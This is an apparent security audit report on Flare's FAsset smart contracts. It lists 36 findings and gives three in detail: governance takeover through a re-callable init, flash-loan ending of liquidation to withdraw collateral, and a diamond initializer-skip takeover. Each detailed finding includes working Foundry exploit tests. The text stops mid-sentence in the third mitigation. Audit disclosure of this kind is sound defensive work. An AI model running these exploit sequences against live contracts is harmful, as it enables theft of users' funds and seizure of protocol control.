# 2025 08 flare - Findings Report
## Commit hash: b703ea27ee98e488d245083c63011cdbf43a74c4

##Findings by Pattern


 **Derived From** : AssetManager diamond can be re-initialized by anyone (governance takeover)

[H-1]. Unprotected AssetManagerInit.init lets any EOA reset governance/settings and seize diamond control



 **Derived From** : Flash-loanable CR check lets agent end liquidation and withdraw in same tx

[M-2]. Agent can flash-boost CR via updateCollateral to exit liquidation and withdraw announced collateral in same tx



 **Derived From** : Diamond initializer never runs due to inverted _init==0 check

[H-3]. Permissionless governance takeover via externally callable init after diamondCut skips initializer



 **Derived From** : Redemption failed path calls finish with invalid status, permanently reverting

[M-4]. Invalid FAILED status passed to Redemptions.finishRedemptionRequest bricks failed confirmations



 **Derived From** : wNat.balanceOf(address(this)) == totalCollateral

[M-5]. CollateralPool trusts reward/distribution claim return value, desyncing totalCollateral from actual WNat and DoSing exits/payouts
[M-6]. Unexpected WNat donations desync totalCollateral and DoS upgradeWNatContract() migration



 **Derived From** : FTSO price used without freshness/heartbeat checks for CR and pricing

[M-7]. CollateralPool exits can bypass exit-CR using stale spot oracle via AssetManager.assetPriceNatWei (no max-age) enabling premature withdrawals



 **Derived From** : forall a in holders: debtLockedTokensOf(a) + debtFreeTokensOf(a) == ICollateralPoolToken(token).balanceOf(a)

[H-8]. Overpaying fee debt makes totalFAssetFeeDebt negative, overflows total virtual fees and bricks CollateralPool.exit for everyone



 **Derived From** : Challenge proofs replayable: reward drains agent as liquidation never starts

[H-9]. Replayable illegalPaymentChallenge lets anyone claim challenger reward repeatedly and drain agent vault



 **Derived From** : on successful return: agent.status == Agent.Status.NORMAL && agent.liquidationStartedAt == 0 && agent.collateralsUnderwater == 0

[H-10]. Full liquidation can be stopped permissionlessly via endLiquidation due to inverted condition in Liquidation.endLiquidationIfHealthy



 **Derived From** : (pre.totalCollateral - post.totalCollateral) == ret && (pre.wNatBalance - wNat.balanceOf(address(this))) == ret

[M-11]. exitTo allows sending ETH to WNat, re-wrapping back to pool and desynchronizing accounting (ret != ΔwNat)



 **Derived From** : Oracle price used without staleness check to value challenger rewards

[M-12]. Stale FTSO price (no heartbeat) inflates challenger payout via Conversion.currentAmgPriceInTokenWei



 **Derived From** : USD5→token conversion skips decimals when no FTSO symbol (mispriced rewards)

[M-13]. Underpaid USD-fixed rewards when vault token has no FTSO symbol: Conversion.convertFromUSD5 ignores token.decimals



 **Derived From** : Collateral payout uses untrusted spot price without staleness checks

[M-14]. redeemFromAgentInCollateral uses untrusted spot FTSO price without heartbeat, enabling stale/manipulated price to inflate or short-change collateral payouts



 **Derived From** : if request.transferToCoreVault == false then (let ev = last RedemptionDefault(agentVault, redeemer, id, underlyingValueUBA, paidC1Wei, paidPoolWei)): (paidC1Wei + paidPoolWei) > 0 && ERC20(Agents.getVaultCollateral(Agent.get(request.agentVault)).token).balanceOf(request.redeemer)_post - _pre == paidC1Wei && IWNat(Globals.getWNat()).balanceOf(request.redeemer)_post - _pre == paidPoolWei; else (Core-Vault) last RedemptionDefault has paidC1Wei == 0 && paidPoolWei == 0

[H-15]. Partial vault payout mis-accounted in redemptionPaymentDefault causes RedemptionDefault event/balance mismatch and underpayment



 **Derived From** : On success: agent.getVaultCollateralToken() == _token && agent.withdrawalAnnouncement(Collateral.Kind.VAULT).allowedAt == 0 && AgentCollateral.collateralRatioBIPS(AgentCollateral.agentVaultCollateralData(agent), agent) >= agent.getVaultCollateral().minCollateralRatioBIPS

[H-16]. switchVaultCollateral can be passed with zero-price feed (infinite CR), enabling unannounced drain of deprecated collateral



 **Derived From** : sum(execFeeWei for each RedemptionRequested event emitted in this tx) == msg.value - (msg.value % Conversion.GWEI)

[H-17]. Executor fee gets stuck if redeem creates 0 requests (front-of-queue sub‑lot tickets + ticket cap) — fee conservation breaks



 **Derived From** : FAsset cleanup block setter lacks role check

[M-18]. Anyone can set FAsset.cleanupBlockNumber, enabling forced checkpoint pruning and breaking snapshot-dependent flows



 **Derived From** : call reverts if !Agents.isOwner(agent, msg.sender)

[M-19]. Whitelist bypass: non‑whitelisted agent owners can pass selfMint gate due to AgentOwnerRegistry.isWhitelisted using msg.sender



 **Derived From** : Let settings = Globals.getSettings(). If settings.mintingCapAMG > 0 then post(AssetManagerState.get().totalReservedCollateralAMG) + Conversion.convertUBAToAmg(IERC20(settings.fAsset).totalSupply()) <= settings.mintingCapAMG

[M-20]. Global minting cap can be exceeded due to floor rounding of pool-fee AMG in reserveCollateral



 **Derived From** : post.totalCollateral == 0 && post.wNat.balanceOf(address(this)) == 0

[M-21]. Permissionless pool entry DoS prevents CollateralPool.destroy from ever reaching zero-balance post-state



 **Derived From** : Non‑agent withdrawal confirmation can be DoS’d by reward payout revert

[M-22]. confirmUnderlyingWithdrawal can be DoS’d when AgentPayout/IIAgentVault.payout reverts, blocking third‑party confirmations



 **Derived From** : address(this).balance == 0 && internalWithdrawal == false

[M-23]. Forced native token (ETH/FLR) can brick CollateralPool operations by leaving nonzero balance via selfdestruct



 **Derived From** : After call: agent.poolCollateralIndex == AssetManagerState.get().poolCollateralIndex AND Agents.getPoolWNat(agent) == IWNat(address(AssetManagerState.get().collateralTokens[AssetManagerState.get().poolCollateralIndex].token)).

[M-24]. Agent can bypass stricter pool min-CR after WNat rotation by not calling upgradeWNatContract



 **Derived From** : Minting cap check floors pool fee to AMG, enabling 1‑AMG cap bypass

[M-25]. Sum-of-floors in Minting.checkMintingCap allows exceeding minting cap by 1 AMG and can brick further minting



 **Derived From** : On any successful challenge call, after _liquidateAndRewardChallenger returns: Agent.get(_agentVault).status == Agent.Status.FULL_LIQUIDATION && Agent.get(_agentVault).liquidationStartedAt > 0

[H-26]. Full-liquidation start timestamp not set on challenge path enables instant max-premium liquidations



 **Derived From** : (post.totalCollateral == 0 || post.totalCollateral >= MIN_NAT_BALANCE_AFTER_EXIT) && (post.token.totalSupply() == 0 || post.token.totalSupply() >= MIN_TOKEN_SUPPLY_AFTER_EXIT)

[M-27]. Exits can be permanently DoS’ed when pool NAT falls below MIN_NAT_BALANCE_AFTER_EXIT via protocol payout before user exit



 **Derived From** : Duplicate-payment challenge can be replayed to drain agent reward

[H-28]. Replayable doublePaymentChallenge pays the same proofs repeatedly due to missing consumption and broken full liquidation guard



 **Derived From** : Full liquidation start time not set on challenge, breaking liquidation timing

[M-29]. startFullLiquidation leaves liquidationStartedAt = 0 when triggered by ChallengesFacet, pushing liquidation premium to max immediately



 **Derived From** : Zero price => infinite CR; liquidation can be skipped/ended via price desync

[M-30]. Zero-price path inflates CR to 1e10 and, via max(ratio,ratioTrusted), suppresses/ends liquidation



 **Derived From** : Whitelist check uses msg.sender instead of parameter, bypassing auth

[M-31]. AgentOwnerRegistry.isWhitelisted uses msg.sender instead of _address, breaking agent onboarding gate



 **Derived From** : totalCollateral == old(totalCollateral) + msg.value

[H-32]. First-entrant share inflation in CollateralPool.enter drains pre-existing pool fees and collateral



 **Derived From** : Emergency pause bypass in executeMinting allows minting while paused

[M-33]. executeMinting lacks pause/attachment gating, allowing mint finalization during emergency pause



 **Derived From** : Executor can brick mint finalization by reverting on native payout

[L-34]. MintingFacet.executeMinting can be bricked by a reverting executor fallback (griefable native payout DoS)



 **Derived From** : Anyone can set redemptionPaymentExtensionSeconds via facet init

[M-35]. Permissionless initializer in RedemptionTimeExtensionFacet lets first caller set global redemptionPaymentExtensionSeconds causing system-wide redemption timing DoS



 **Derived From** : Unprotected initializer lets anyone set CoreVault manager and parameters

[M-36]. Permissionless one-time initializer in CoreVaultClientSettingsFacet allows arbitrary CoreVault manager and params to be set


### Number of Findings
- C: 0
- H: 11
- M: 24
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : AssetManager diamond can be re-initialized by anyone (governance takeover)

## [H-1]. Unprotected AssetManagerInit.init lets any EOA reset governance/settings and seize diamond control

## Derived From Pattern/Invariant
AssetManager diamond can be re-initialized by anyone (governance takeover)

## Exploit Type
UpgradeabilityInitializerSafety

## Location
AssetManagerInit.init

## Minimim Privilege Required
Permissionless

## Description
AssetManagerInit exposes an external init(...) that sets governance, governanceSettings, system-wide AssetManagerSettings (incl. assetManagerController, priceReader, factories, fees, CRs), collateral types, and ERC165 flags. It has no access control and no one-time initializer guard, so it can be called at any time post-deploy. Vulnerable signature:

function init(
    IGovernanceSettings _governanceSettings,
    address _initialGovernance,
    AssetManagerSettings.Data memory _settings,
    CollateralType.Data[] memory _initialCollateralTypes
) external // no onlyGovernance, no initializer guard

An attacker can re-call init to set themselves as governance and assetManagerController and point governanceSettings to a malicious settings contract with 0 timelocks. With controller rights they can invoke onlyAssetManagerController setters (pause/unpause, change price reader, factories), upgrade the FAsset implementation, distort economic parameters, and via diamondCut (with 0 min timelock) replace facets and run arbitrary delegatecall during cut._init. This is a classic re-initialization/control-takeover in diamonds.

## Impact
Because AssetManagerInit.init is externally callable without a one-time initializer guard, any EOA can re-run initialization even after a legitimate deployment. This lets an attacker reset governance, governanceSettings, and AssetManagerSettings (including diamondCut min timelock and assetManagerController) and immediately exercise controller/governance powers. They can pause/unpause, distort parameters, and perform governance upgrades (diamondCut or FAsset UUPS upgrades), enabling full protocol control and downstream fund theft or bricking.

## Proof of Concept
Revised step-by-step PoC demonstrating re-initialization and takeover:

1) System is deployed and properly initialized once by deployer/governance via AssetManagerInit.init, setting governance, governanceSettings, and a legitimate assetManagerController.
2) Attacker later calls AssetManagerInit.init again (no access control or one-time guard), passing:
   - _initialGovernance = attacker
   - _governanceSettings = attacker-controlled IGovernanceSettings
   - _settings.assetManagerController = attacker (and, if needed, diamondCutMinTimelockSeconds = 0)
   - _initialCollateralTypes = [] (or minimal valid set)
3) The second init overwrites the existing governance, governanceSettings, and controller in diamond storage.
4) Attacker immediately proves control by invoking onlyAssetManagerController functions (e.g., pauseMinting) and then performs governance-controlled upgrades (diamondCut or FAsset upgrade) under attacker-controlled governance/timelocks.
5) Result: complete, permissionless governance and upgrade takeover.

## Proof of Code
pragma solidity ^0.8.27;
import "forge-std/Test.sol";
import {AssetManager} from "contracts/assetManager/implementation/AssetManager.sol";
import {AssetManagerInit} from "contracts/assetManager/facets/AssetManagerInit.sol";
import {SettingsReaderFacet} from "contracts/assetManager/facets/SettingsReaderFacet.sol";
import {SystemStateManagementFacet} from "contracts/assetManager/facets/SystemStateManagementFacet.sol";
import {SystemInfoFacet} from "contracts/assetManager/facets/SystemInfoFacet.sol";
import {LibDiamond} from "contracts/diamond/library/LibDiamond.sol";
import {IGovernanceSettings} from "contracts/governance/implementation/GovernedBase.sol";
import {AssetManagerSettings} from "contracts/userInterfaces/data/AssetManagerSettings.sol";
import {CollateralType} from "contracts/userInterfaces/data/CollateralType.sol";

contract AssetManagerInitReinitTest is Test {
    AssetManager diamond;
    AssetManagerInit initFacet;
    SettingsReaderFacet settingsFacet;
    SystemStateManagementFacet stateFacet;
    SystemInfoFacet infoFacet;
    address gov;
    address controller;
    address attacker;

    function setUp() public {
        gov = makeAddr("gov");
        controller = makeAddr("controller");
        attacker = makeAddr("attacker");

        initFacet = new AssetManagerInit();
        settingsFacet = new SettingsReaderFacet();
        stateFacet = new SystemStateManagementFacet();
        infoFacet = new SystemInfoFacet();

        LibDiamond.FacetCut[] memory cut = new LibDiamond.FacetCut[](4);
        // 0) install init facet selectors
        bytes4[] memory sel0 = new bytes4[](2);
        sel0[0] = AssetManagerInit.init.selector;
        sel0[1] = AssetManagerInit.upgradeERC165Identifiers.selector;
        cut[0] = LibDiamond.FacetCut({
            facetAddress: address(initFacet),
            action: LibDiamond.FacetCutAction.Add,
            functionSelectors: sel0
        });
        // 1) settings read
        bytes4[] memory sel1 = new bytes4[](1);
        sel1[0] = SettingsReaderFacet.assetManagerController.selector;
        cut[1] = LibDiamond.FacetCut({
            facetAddress: address(settingsFacet),
            action: LibDiamond.FacetCutAction.Add,
            functionSelectors: sel1
        });
        // 2) state mgmt (controller-only actions)
        bytes4[] memory sel2 = new bytes4[](2);
        sel2[0] = SystemStateManagementFacet.pauseMinting.selector;
        sel2[1] = SystemStateManagementFacet.unpauseMinting.selector;
        cut[2] = LibDiamond.FacetCut({
            facetAddress: address(stateFacet),
            action: LibDiamond.FacetCutAction.Add,
            functionSelectors: sel2
        });
        // 3) system info (mintingPaused view)
        bytes4[] memory sel3 = new bytes4[](1);
        sel3[0] = SystemInfoFacet.mintingPaused.selector;
        cut[3] = LibDiamond.FacetCut({
            facetAddress: address(infoFacet),
            action: LibDiamond.FacetCutAction.Add,
            functionSelectors: sel3
        });

        diamond = new AssetManager(cut, address(0), "");
    }

    function _getController() internal view returns (address) {
        (bool ok, bytes memory out) = address(diamond).staticcall(
            abi.encodeWithSelector(SettingsReaderFacet.assetManagerController.selector)
        );
        require(ok, "read controller failed");
        return abi.decode(out, (address));
    }

    function _isMintingPaused() internal view returns (bool) {
        (bool ok, bytes memory out) = address(diamond).staticcall(
            abi.encodeWithSelector(SystemInfoFacet.mintingPaused.selector)
        );
        require(ok, "read paused failed");
        return abi.decode(out, (bool));
    }

    function test_reinitLetsAttackerSeizeControl() public {
        // 1) Legitimate initial init by governance
        AssetManagerSettings.Data memory settings1;
        settings1.assetManagerController = controller;
        CollateralType.Data[] memory emptyCollats = new CollateralType.Data[](0);

        vm.prank(gov);
        (bool ok,) = address(diamond).call(
            abi.encodeWithSelector(
                AssetManagerInit.init.selector,
                IGovernanceSettings(address(0xBEEF)),
                gov,
                settings1,
                emptyCollats
            )
        );
        assertTrue(ok, "initial init failed");
        assertEq(_getController(), controller, "controller not set");

        // 2) Attacker re-calls init and overwrites controller/governance
        AssetManagerSettings.Data memory settings2;
        settings2.assetManagerController = attacker;
        vm.prank(attacker);
        (ok,) = address(diamond).call(
            abi.encodeWithSelector(
                AssetManagerInit.init.selector,
                IGovernanceSettings(address(0xDEAD)),
                attacker,
                settings2,
                emptyCollats
            )
        );
        assertTrue(ok, "re-init failed");
        assertEq(_getController(), attacker, "controller not overwritten");

        // 3) Attacker uses controller powers
        vm.prank(attacker);
        (ok,) = address(diamond).call(abi.encodeWithSelector(SystemStateManagementFacet.pauseMinting.selector));
        assertTrue(ok, "pause failed");
        assertTrue(_isMintingPaused(), "minting not paused");
    }
}


## Suggested Mitigation
Eliminate re-initialization entirely and prevent permissionless calls: 1) Add a dedicated initializer guard in diamond storage (e.g., bytes32 slot) and require(!initialized) at the top of AssetManagerInit.init; set initialized = true on success. 2) Make init callable only once during the AssetManager constructor via the diamond’s _init delegatecall (pass AssetManagerInit.init as the initializer in AssetManager’s constructor) and consider removing the init selector from the diamond immediately after successful initialization to reduce attack surface. 3) Validate inputs and forbid zero addresses (governanceSettings, initialGovernance, essential factories/readers). 4) Do not allow init to overwrite existing governance/governanceSettings if already set (e.g., require current governance == address(0)). Optionally, gate init under onlyDiamondConstructor or a one-time onlyGovernance bootstrap flow. These changes fully prevent post-deploy reinitialization and governance takeover.





 **Derived From** : Flash-loanable CR check lets agent end liquidation and withdraw in same tx

## [M-2]. Agent can flash-boost CR via updateCollateral to exit liquidation and withdraw announced collateral in same tx

## Derived From Pattern/Invariant
Flash-loanable CR check lets agent end liquidation and withdraw in same tx

## Exploit Type
FlashLoanEconomicManipulation

## Location
AgentCollateralFacet.updateCollateral

## Minimim Privilege Required
RequiresRole

## Description
AgentCollateralFacet.updateCollateral lets the agent vault or its pool call Liquidation.endLiquidationIfHealthy whenever a collateral token is updated. endLiquidationIfHealthy computes vaultCR/poolCR off instantaneous spot values: vault token balanceOf(vault) and pool.totalCollateral(). If both exceed targets it immediately flips agent.status to NORMAL. beforeCollateralWithdrawal only blocks withdrawals while status != NORMAL (unless backedAMG==0). Therefore, an agent in liquidation can:
- Flash-deposit vault collateral and pool collateral (or otherwise temporarily inflate pool.totalCollateral),
- Call AgentVault.updateCollateral(token) which in turn calls AssetManager.updateCollateral and Liquidation.endLiquidationIfHealthy,
- Get status flipped to NORMAL using the intra-tx balance spike,
- Immediately call withdrawCollateral on the AgentVault for a previously announced and matured withdrawal (AssetManager.beforeCollateralWithdrawal passes while status==NORMAL),
- Repay the flash loan, leaving the system undercollateralized and having bypassed the intended 'no withdrawal while liquidating' rule.
Vulnerable snippets:
AgentCollateralFacet.updateCollateral:
require(msg.sender == _agentVault || msg.sender == address(agent.collateralPool), OnlyAgentVaultOrPool());
if (agent.isCollateralToken(_token)) {
    Liquidation.endLiquidationIfHealthy(agent);
}

Liquidation.endLiquidationIfHealthy (excerpt):
cr = getCollateralRatiosBIPS(_agent); // uses token.balanceOf(vault) and pool.totalCollateral()
if (cr.vaultCR >= target && cr.poolCR >= target) {
    _agent.status = Agent.Status.NORMAL;
    _agent.liquidationStartedAt = 0;
    _agent.collateralsUnderwater = 0;
}
There is no delay, multi-block observation, or stickiness, so a one-tx balance spike can bypass liquidation gating.

## Impact
Agent can withdraw announced vault/pool collateral while objectively still unsafe, worsening insolvency for redeemers and pool, and undermining liquidation integrity. Immediate extractable value equals the announced withdrawal amount.

## Proof of Concept
Preconditions: agent in LIQUIDATION with a matured vault-collateral withdrawal announcement (allowedAt in the past). Pool CR or vault CR below target under real balances.
Attack (single tx by agent owner):
1) Flash-loan vault collateral token and native (pool) collateral; transfer to the AgentVault and CollateralPool to spike balances.
2) From AgentVault, call updateCollateral(vaultToken). AssetManager.updateCollateral runs and calls Liquidation.endLiquidationIfHealthy, which sees elevated vaultCR/poolCR and sets status = NORMAL immediately.
3) Call AgentVault.withdrawCollateral(vaultToken, announcedAmount, recipient). AssetManager.beforeCollateralWithdrawal now passes (status==NORMAL and time window ok) and clears the announcement; AgentVault transfers tokens to recipient.
4) Repay flash loans using the transferred-out tokens or other funds. End state: status may get re-liquidated later, but the agent extracted the announced collateral during liquidation, shrinking buffers for redeemers and the pool.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {AgentCollateralFacet} from "contracts/assetManager/facets/AgentCollateralFacet.sol";
import {Liquidation} from "contracts/assetManager/library/Liquidation.sol";
import {Agents} from "contracts/assetManager/library/Agents.sol";
import {Agent} from "contracts/assetManager/library/data/Agent.sol";
import {AssetManagerState} from "contracts/assetManager/library/data/AssetManagerState.sol";
import {CollateralTypeInt} from "contracts/assetManager/library/data/CollateralTypeInt.sol";
import {Collateral} from "contracts/assetManager/library/data/Collateral.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TestERC20 is IERC20 {
    string public name; string public symbol; uint8 public immutable decimals;
    mapping(address=>uint256) public override balanceOf; mapping(address=>mapping(address=>uint256)) public override allowance;
    uint256 public override totalSupply;
    constructor(string memory n,string memory s,uint8 d){name=n;symbol=s;decimals=d;}
    function transfer(address to,uint256 a) external override returns(bool){balanceOf[msg.sender]-=a;balanceOf[to]+=a;emit Transfer(msg.sender,to,a);return true;}
    function approve(address sp,uint256 a) external override returns(bool){allowance[msg.sender][sp]=a;emit Approval(msg.sender,sp,a);return true;}
    function transferFrom(address f,address t,uint256 a) external override returns(bool){uint256 al=allowance[f][msg.sender];if(al!=type(uint256).max){allowance[f][msg.sender]=al-a;} balanceOf[f]-=a; balanceOf[t]+=a; emit Transfer(f,t,a); return true;}
    function mint(address to,uint256 a) external {balanceOf[to]+=a; totalSupply+=a; emit Transfer(address(0),to,a);} }

interface IMinimalPool { function setTotalCollateral(uint256 v) external; function totalCollateral() external view returns (uint256); function poolToken() external view returns (IERC20); }

contract MockPool is IMinimalPool {
    uint256 public _tc; IERC20 public _poolToken; constructor(IERC20 pt){_poolToken=pt;}
    function setTotalCollateral(uint256 v) external { _tc = v; }
    function totalCollateral() external view returns (uint256) { return _tc; }
    function poolToken() external view returns (IERC20) { return _poolToken; }
}

contract MockAgentVault {
    AgentCollateralFacet public am; address public owner;
    constructor(AgentCollateralFacet _am){am=_am; owner=msg.sender;}
    modifier onlyOwner(){require(msg.sender==owner, "onlyOwner"); _;}
    function updateCollateral(IERC20 t) external onlyOwner { am.updateCollateral(address(this), t); }
    function withdrawCollateral(IERC20 t, uint256 a, address r) external onlyOwner {
        am.beforeCollateralWithdrawal(t, a);
        require(t.transfer(r, a));
    }
}

contract FlashLoanCRExitTest is Test {
    AgentCollateralFacet am;
    TestERC20 vaultToken; TestERC20 poolToken;
    MockPool pool;
    MockAgentVault vault;
    address agentOwner = address(0xA11CE);
    address attacker = address(0xBEEF);

    function setUp() public {
        am = new AgentCollateralFacet();
        vaultToken = new TestERC20("USDX","USDX",18);
        poolToken = new TestERC20("FCPT","FCPT",18);
        pool = new MockPool(poolToken);
        vm.prank(agentOwner);
        vault = new MockAgentVault(am);

        // Wire minimal collateral types and indices
        AssetManagerState.State storage S = AssetManagerState.get();
        S.collateralTokens.push(); // index 0 - pool collateral (WNAT placeholder)
        S.collateralTokens.push(); // index 1 - vault collateral
        S.poolCollateralIndex = 0;
        CollateralTypeInt.Data storage poolCol = S.collateralTokens[0];
        poolCol.token = IERC20(address(poolToken));
        poolCol.minCollateralRatioBIPS = 15000; // 1.5x
        poolCol.safetyMinCollateralRatioBIPS = 16000; // 1.6x
        CollateralTypeInt.Data storage vaultCol = S.collateralTokens[1];
        vaultCol.token = IERC20(address(vaultToken));
        vaultCol.minCollateralRatioBIPS = 12000; // 1.2x
        vaultCol.safetyMinCollateralRatioBIPS = 13000; // 1.3x

        // Initialize Agent state in diamond storage keyed by vault address
        Agent.State storage A = Agent.get(address(vault));
        A.status = Agent.Status.LIQUIDATION;
        A.vaultCollateralIndex = 1; // vaultToken
        A.poolCollateralIndex = 0;  // pool
        A.collateralPool = IMinimalPool(address(pool));
        A.ownerManagementAddress = agentOwner;
        A.mintedAMG = 10; // non-zero backed -> withdrawals should be blocked while LIQUIDATION
        A.reservedAMG = 0;

        // Pre-create a matured withdrawal announcement for vault collateral
        // Simulate previously announced before liquidation
        A.vaultCollateralWithdrawalAnnouncement.allowedAt = uint64(block.timestamp - 1 hours);
        A.vaultCollateralWithdrawalAnnouncement.amountWei = 1_000 ether;

        // Seed attacker with tokens for flash and to receive withdrawn funds
        vaultToken.mint(attacker, 2_000 ether);
        poolToken.mint(attacker, 1 ether); // dummy
    }

    function test_flashLoanEndsLiquidationAndWithdraws() public {
        // 0) Baseline: withdrawal blocked while LIQUIDATION
        vm.startPrank(agentOwner);
        vm.expectRevert();
        vault.withdrawCollateral(IERC20(address(vaultToken)), 1_000 ether, attacker);
        vm.stopPrank();

        // 1) Flash-boost CR: deposit vault collateral and bump pool.totalCollateral spot
        // Simulate vault flash deposit
        vm.prank(attacker); vaultToken.transfer(address(vault), 2_000 ether);
        // Simulate pool flash spike
        pool.setTotalCollateral(10_000 ether);

        // 2) Call updateCollateral from the vault to end liquidation based on spot balances
        vm.prank(agentOwner);
        vault.updateCollateral(IERC20(address(vaultToken)));

        // Assert liquidation ended
        Agent.State storage A = Agent.get(address(vault));
        assertEq(uint256(A.status), uint256(Agent.Status.NORMAL), "status should be NORMAL after spot-CR boost");

        // 3) Withdraw matured announcement immediately (still in same tx in practice)
        vm.prank(agentOwner);
        vault.withdrawCollateral(IERC20(address(vaultToken)), 1_000 ether, attacker);

        // Announcement cleared and attacker got funds
        assertEq(A.vaultCollateralWithdrawalAnnouncement.amountWei, 0, "announcement cleared");
        assertEq(vaultToken.balanceOf(attacker), 1_000 ether, "attacker received withdrawn collateral");

        // 4) Flash unwind (conceptual) - drop pool back; CR will be unsafe again, but funds are gone
        pool.setTotalCollateral(0);

        // End state: Agent can be re-liquidated, but the withdrawal was executed during liquidation window
    }
}


## Suggested Mitigation
Make liquidation exit sticky and multi-block-observed. Options:
- Enforce a grace period after endLiquidationIfHealthy before allowing any withdrawals: set a cooldown timestamp (e.g., liquidationCooloffEnd) and update beforeCollateralWithdrawal to require block.timestamp > liquidationCooloffEnd. Only set NORMAL after the cooldown elapses with CR healthy at the end of the window.
- Use a time-weighted or multi-block observation of vault/pool balances and/or prices when deciding to end liquidation (e.g., require CR above safety target across N recent price rounds) or a heartbeat-based oracle that cannot be flash-manipulated intra-tx.
- Alternatively, move the no-withdrawal constraint to be independent of status: if liquidation was active in the last M seconds, disallow withdrawals regardless of current status; or explicitly forbid withdrawals in the same transaction that ended liquidation (track tx-scoped flag), and require a separate subsequent transaction.
- Restrict updateCollateral to be callable only by AssetManager (not vault/pool) or add an allowlist of contexts that cannot be induced by the agent in the same tx as a deposit.
- As a minimal patch, in beforeCollateralWithdrawal also require that both vaultCR and poolCR exceed safety thresholds using a trusted price source and optionally a previous-block snapshot; do not rely on status alone.





 **Derived From** : Diamond initializer never runs due to inverted _init==0 check

## [H-3]. Permissionless governance takeover via externally callable init after diamondCut skips initializer

## Derived From Pattern/Invariant
Diamond initializer never runs due to inverted _init==0 check

## Exploit Type
UpgradeabilityInitializerSafety

## Location
LibDiamond.initializeDiamondCut

## Minimim Privilege Required
Permissionless

## Description
LibDiamond.initializeDiamondCut executes the delegatecall to the initializer only when _init == address(0), inverting EIP-2535’s intent. As a result, deployment/upgrade cuts that correctly pass a nonzero _init silently skip initialization. If the initializer facet is also added to the diamond’s selector table (common when it exposes other helpers like ERC165 updates), its init() remains externally callable. Any EOA can then call init() directly on the diamond to set governance to themselves and seize control. The SlithIR shows the wrong branch:

if (_init == address(0)) {
  enforceHasContractCode(_init, "LibDiamondCut: _init address has no code");
  (bool success, bytes memory error) = _init.delegatecall(_calldata);
  if (!success) { ... revert ... }
}

Consequences: 1) Legitimate initializers never run, leaving governance/storage uninitialized. 2) The init function becomes a public backdoor to set governance. 3) Once governance is hijacked, the attacker can execute diamondCut to install arbitrary facets (e.g., helpers that payout from pools), effectively capturing control of the system.

## Impact
Full governance/control loss of the diamond. Attacker can run diamondCut to add malicious facets, change logic, distort rewards, or route collateral/payout flows; also blocks safe upgrades that rely on init.

## Proof of Concept
Step-by-step:
1) Deploy the diamond with a cut that includes DiamondCutFacet and an initializer facet (e.g., DiamondInit) and pass _init = DiamondInit with calldata for init(...). Due to the inverted condition, the initializer is NOT executed.
2) Any EOA calls init(...) on the diamond directly (the selector is present), setting governance to themselves.
3) As governance, the attacker immediately calls diamondCut to add arbitrary/malicious facets. From here, the attacker controls upgradeability and can modify system behavior to siphon value (e.g., add a facet that invokes CollateralPool.payout to attacker).

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {AssetManager} from "contracts/assetManager/implementation/AssetManager.sol";
import {IDiamondCut} from "contracts/diamond/interfaces/IDiamondCut.sol";
import {DiamondCutFacet} from "contracts/diamond/mock/DiamondCutFacet.sol";
import {DiamondInit} from "contracts/diamond/mock/DiamondInit.sol";
import {Test2Facet} from "contracts/diamond/mock/Test2Facet.sol";

interface IDiamondInit { function init(address _governanceSettings, address _initialGovernance) external; }

contract InitOrderExploitTest is Test {
    address attacker = address(0xBEEF);

    function test_GovernanceHijack_via_SkippedInit() public {
        // Deploy facets
        DiamondCutFacet cutFacet = new DiamondCutFacet();
        DiamondInit initFacet = new DiamondInit();
        Test2Facet newFacet = new Test2Facet();

        // Prepare initial cut: add DiamondCutFacet and DiamondInit.init(address,address)
        IDiamondCut.FacetCut[] memory cut = new IDiamondCut.FacetCut[](2);
        {
            bytes4[] memory sel = new bytes4[](1);
            sel[0] = bytes4(keccak256("diamondCut((address,uint8,bytes4[])[],address,bytes)"));
            cut[0] = IDiamondCut.FacetCut({
                facetAddress: address(cutFacet),
                action: IDiamondCut.FacetCutAction.Add,
                functionSelectors: sel
            });
        }
        {
            bytes4[] memory sel = new bytes4[](1);
            sel[0] = bytes4(keccak256("init(address,address)"));
            cut[1] = IDiamondCut.FacetCut({
                facetAddress: address(initFacet),
                action: IDiamondCut.FacetCutAction.Add,
                functionSelectors: sel
            });
        }

        // Deploy the diamond (AssetManager wraps Diamond) and pass _init = initFacet (will be skipped due to bug)
        AssetManager diamond = new AssetManager(
            cut,
            address(initFacet),
            abi.encodeWithSelector(bytes4(keccak256("init(address,address)")), address(0x1), address(0xDEAD))
        );

        // As non-governance, diamondCut should revert
        {
            IDiamondCut.FacetCut[] memory addNew = new IDiamondCut.FacetCut[](1);
            bytes4[] memory s = new bytes4[](1);
            s[0] = Test2Facet.test2Func1.selector;
            addNew[0] = IDiamondCut.FacetCut(address(newFacet), IDiamondCut.FacetCutAction.Add, s);
            vm.expectRevert();
            IDiamondCut(address(diamond)).diamondCut(addNew, address(0), "");
        }

        // Permissionless attacker initializes governance via exposed init(...)
        vm.prank(attacker);
        (bool okInit,) = address(diamond).call(
            abi.encodeWithSelector(bytes4(keccak256("init(address,address)")), address(0x1), attacker)
        );
        assertEq(okInit, true);

        // Now attacker (as governance) can diamondCut to add arbitrary facets
        IDiamondCut.FacetCut[] memory addCut = new IDiamondCut.FacetCut[](1);
        bytes4[] memory sel2 = new bytes4[](1);
        sel2[0] = Test2Facet.test2Func1.selector;
        addCut[0] = IDiamondCut.FacetCut(address(newFacet), IDiamondCut.FacetCutAction.Add, sel2);

        vm.prank(attacker);
        IDiamondCut(address(diamond)).diamondCut(addCut, address(0), "");

        // Verify newly added function can be called through the diamond
        (bool success,) = address(diamond).call(abi.encodeWithSelector(Test2Facet.test2Func1.selector));
        assertEq(success, true);
    }
}


## Suggested Mitigation
Update LibDiamond.initializeDiamondCut to execute delegatecall only when _init != address(0). Additionally, enforce calldata consistency to prevent silent misconfiguration. Example:

function initializeDiamondCut(address _init, bytes memory _calldata) internal {
    if (_init == address(0)) {
        require(_calldata.length == 0, "LibDiamondCut: _calldata must be empty if _init is address(0)");
        return;
    }
    enforceHasContractCode(_init, "LibDiamondCut: _init address has no code");
    require(_calldata.length > 0, "LibDiamondCut: _calldata must be non-empty");
    (bool success, bytes memory error) = _init.delegatecall(_calldata);
    if (!success) {
        if (error.length > 0) assembly { revert(add(error, 32), mload(error)) }
        revert InitializationFunctionReverted(_init, _calldata);
    }
}

Operational hardening:
